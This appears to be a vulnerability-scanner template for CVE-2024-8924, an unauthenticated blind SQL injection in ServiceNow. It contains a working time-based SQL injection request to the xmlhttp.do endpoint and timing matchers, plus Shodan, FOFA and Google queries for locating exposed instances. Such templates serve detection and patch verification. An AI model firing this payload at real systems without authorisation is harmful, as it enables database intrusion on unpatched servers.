id: CVE-2024-8924

info:
  name: ServiceNow - Unauthenticated Blind SQL Injection
  author: kino
  severity: high
  description: |
    ServiceNow has addressed a blind SQL injection vulnerability that was identified in the Now Platform. 
    This vulnerability could enable an unauthenticated user to extract unauthorized information from the database. 
    ServiceNow deployed an update to hosted instances, and provided the update to partners and self-hosted customers.
  reference:
    - https://support.servicenow.com/kb?id=kb_article_view&sysparm_article=KB1706072
    - https://nvd.nist.gov/vuln/detail/CVE-2024-8924
  metadata:
    verified: true
    max-request: 2
    vendor: servicenow
    product: servicenow
    shodan-query:
      - http.favicon.hash:"1701804003"
      - http.title:"servicenow"
    fofa-query:
      - icon_hash=1701804003
      - title="servicenow"
    google-query: intitle:"servicenow"
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: 89
  tags: cve,cve2024,servicenow,sqli,blind,kev

http:
  - raw:
      - |
        GET /xmlhttp.do?sysparm_processor=com.glide.ui.ckb.ajax.SysKBDocumentAjaxProcessor&sysparm_name=get_articles_by_category&sysparm_value=1' AND (SELECT 7182 FROM (SELECT(SLEEP(6)))vYxB) AND 'QJWq'='QJWq HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

      - |
        GET /xmlhttp.do?sysparm_processor=com.glide.ui.ckb.ajax.SysKBDocumentAjaxProcessor&sysparm_name=get_articles_by_category&sysparm_value=1 HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "len(body_1) == len(body_2)"
          - "status_code_1 == status_code_2"
          - "duration_1 - duration_2 >= 6"
        condition: and

      - type: status
        status:
          - 200
